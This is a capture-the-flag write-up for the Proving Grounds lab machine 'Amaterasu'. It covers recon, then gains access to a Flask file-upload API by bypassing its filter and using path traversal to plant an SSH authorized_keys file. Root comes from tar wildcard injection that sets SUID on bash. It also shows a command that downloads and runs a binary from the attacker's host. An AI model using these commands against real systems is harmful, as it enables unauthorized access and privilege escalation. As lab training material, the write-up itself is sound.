---
render_with_liquid: false
title: PG Play  Amaterasu
date: 2024-06-16 01:37:11 +1400
tags: [pg-play, nmap, linux, feroxbuster, python-flask, api, directory-traversal, file-upload, pspy, scheduled-job-abuse, bash-script, tar-privesc, wildcards]
---



# Learnt / Summary

- Always write something in a test file...

# Recon

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Jun 16 01:37:11 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,25022,33414,40080, 192.168.244.249
Nmap scan report for 192.168.244.249
Host is up, received user-set (0.063s latency).
Scanned at 2024-06-16 01:37:11 CST for 300s

PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.248
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
25022/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD6xv/PZkusP5TZdYJWDT8TTNY2xojo5b2DU/zrXm1tP4kkjNCGmwq8UwFrjo5EbEbk3wMmgHBnE73XwgnqaPd4=
|   256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRX3RvvSVPY3FJV9u7N2xIQbLJgQoEMkmRMey39/Jxz
33414/tcp open  unknown syn-ack ttl 61
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Sat, 15 Jun 2024 17:38:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Hello: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('EHLO').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.53 ((Fedora))
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33414-TCP:V=7.94SVN%I=9%D=6/16%Time=666DD14E%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkze
SF:ug/2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Sat,\x2015\x20Jun\x202024\x20
SF:17:38:09\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCont
SF:ent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found<
SF:/h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2
SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x
SF:20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(HTTPOpti
SF:ons,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.
SF:3\x20Python/3\.9\.13\r\nDate:\x20Sat,\x2015\x20Jun\x202024\x2017:38:09\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20l
SF:ang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>
SF:The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.
SF:\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x
SF:20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(RTSPRequest,1F4,"
SF:<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dt
SF:d\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-
SF:8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Messag
SF:e:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_
SF:REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method
SF:\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(Hello,1EF,"<!DOCTYPE\x20
SF:HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\
SF:n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-
SF:equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20
SF:\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h
SF:1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20c
SF:ode:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20
SF:request\x20syntax\x20\('EHLO'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad
SF:\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x2
SF:0\x20</body>\n</html>\n");
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jun 16 01:42:11 2024 -- 1 IP address (1 host up) scanned in 300.11 seconds
```

## 80 - HTTP : 404 blank page


### Info

```ruby
http://192.168.244.249:33414 [404] [404 Not Found] [Werkzeug/2.2.3 Python/3.9.13] [d767b3cb0ad66544c649e4165fc4b37e3c17e370] [Flask:2.2.3,Python:3.9.13]
```

![](/assets/obsidian/5a9517d172bf16e6d63d5f6e8f924bbf.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):33414" -o ferox_33414.txt
```

```bash
200      GET        1l       19w      137c http://192.168.244.249:33414/help
200      GET        1l       14w       98c http://192.168.244.249:33414/info
```

# Initial Access


## Enumeration


### 80 - Python Rest API

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414/help | jq .
[
  "GET /info : General Info",
  "GET /help : This listing",
  "GET /file-list?dir=/tmp : List of the files",
  "POST /file-upload : Upload files"
]

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414/info | jq .
[
  "Python File Server REST API v2.5",
  "Author: Alfredo Moroder",
  "GET /help = List of the commands"
]

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414/file-list?dir=/tmp | jq .
[
  "flask.tar.gz",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-httpd.service-wXLGrj",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-ModemManager.service-hNfhpT",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-logind.service-kWkiZ6",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-chronyd.service-9lc593",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-dbus-broker.service-CGddV1",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-resolved.service-RakicW",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-oomd.service-Xii2Ge"
]

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414/file-upload
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

## Shell as alfredo


### 80 - Flask API


#### File upload bypass

Create an empty file to upload

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ echo x > test
```

Guess `file` as a parameter in multiform, the response indicated that it's a valid parameter

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl http://192.168.244.249:33414/file-upload -F "file=@test"
{"message":"No filename part in the request"}
```

A filter is blocking files that aren't `txt, pdf, png, jpg, jpeg, gif`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl http://192.168.244.249:33414/file-upload -F "file=@test" -F "filename=test"
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

The filter isn't checking `filename` parameter

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl http://192.168.244.249:33414/file-upload -F "file=@test" -F "filename=test.txt"
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

We can bypass the file type check by modifying `filename` parameter and specify a valid file type with `file` parameter

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ mv test test.txt

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -X POST http://192.168.244.249:33414/file-upload -F "file=@test.txt" -F "filename=test"
{"message":"File successfully uploaded"}
```

- The uploaded files are located at `/tmp`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414//file-list?dir=/tmp | jq .
[
  "test",
  "flask.tar.gz",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-httpd.service-wXLGrj",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-ModemManager.service-hNfhpT",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-logind.service-kWkiZ6",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-chronyd.service-9lc593",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-dbus-broker.service-CGddV1",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-resolved.service-RakicW",
  "systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-oomd.service-Xii2Ge"
]
```

#### Directory traversal

- I can view `alfredo`'s home folder, but not `root`'s, which means this rest API is running by `alfredo`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414//file-list?dir=/home/alfredo | jq .
[
  ".bash_logout",
  ".bash_profile",
  ".bashrc",
  "local.txt",
  ".ssh",
  "restapi",
  ".bash_history"
]

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414//file-list?dir=/root
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

- We can upload files to arbitrary folder via directory traversal

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -X POST http://192.168.244.249:33414/file-upload -F "file=@test.txt" -F "filename=../home/alfredo/test"
{"message":"File successfully uploaded"}
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -s http://192.168.244.249:33414//file-list?dir=/home/alfredo | jq .
[
  ".bash_logout",
  ".bash_profile",
  ".bashrc",
  "local.txt",
  ".ssh",
  "restapi",
  "test",
  ".bash_history"
]
```

#### Upload ssh public key

Overwrite `alfredo`'s ssh public key with mine to gain remote ssh access

Generate a pair of ssh keys

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ ssh-keygen -f bravosec
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in bravosec
Your public key has been saved in bravosec.pub
The key fingerprint is:
SHA256:jp/E5FlUD4YwO038797uWLU0PaNsxhXIGmCjVJ6UcMg bravosec@fsociety
The key's randomart image is:
+--[ED25519 256]--+
|      .o*Xo.+    |
|      .E***o.o.  |
|       .oooo o.. |
|         o  +   o|
|        S .. . *o|
|       * o  o = *|
|      . *    B ..|
|       o .  o .+ |
|        o    .oo+|
+----[SHA256]-----+
```

Upload the public key

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ cp bravosec.pub authorized_keys.txt

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ curl -X POST http://192.168.244.249:33414/file-upload -F "file=@authorized_keys.txt" -F "filename=../home/alfredo/.ssh/authorized_keys"
{"message":"File successfully uploaded"}
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Amaterasu]
└─$ ssh alfredo@$(pt get rhost) -p 25022 -i bravosec
Warning: Permanently added '[192.168.244.249]:25022' (ED25519) to the list of known hosts.
Last failed login: Sat Jun 15 14:52:18 EDT 2024 from 192.168.45.248 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
```

# Privilege Escalation


## From alfredo to root


### Cron - Bash script : Abuse wildcard in Tar command arguments

Run **pspy** to spy command lines

```bash
[alfredo@fedora ~]$ FILE=pspy64; wget -q 192.168.45.248:443/$FILE -O /tmp/$FILE && chmod +x /tmp/$FILE && /tmp/$FILE &
[2] 29336
```

- A cron job is running `/usr/local/bin/backup-flask.sh`

![](/assets/obsidian/6fdc63f32ac80f63069e4b25600d5b9c.png)

- There's a wildcard in `tar`'s arguments

```bash
[alfredo@fedora ~]$ ls -la /usr/local/bin/backup-flask.sh
-rwxr-xr-x. 1 root root 106 Mar 28  2023 /usr/local/bin/backup-flask.sh
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh

#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

> Reference to abuse wildcard in `tar`'s arguments - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar

```bash
cd /home/alfredo/restapi
echo -e '#!/bin/bash\nchmod +s /bin/bash' > x
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh x'
```

> When the script runs, the tar command will be : `tar czf /tmp/flask.tar.gz --checkpoint=1 --checkpoint-action=exec=sh x *`, which will execute the script I created to give `bash` SUID bits

```bash
[alfredo@fedora restapi]$ bash -p
bash-5.1# id
uid=1000(alfredo) gid=1000(alfredo) euid=0(root) egid=0(root) groups=0(root),1000(alfredo)
bash-5.1# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
bash-5.1# id
uid=0(root) gid=1000(alfredo) egid=0(root) groups=0(root),1000(alfredo)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/926f1cbb92cd59de7818fbb33d82f921.png)

# Appendix

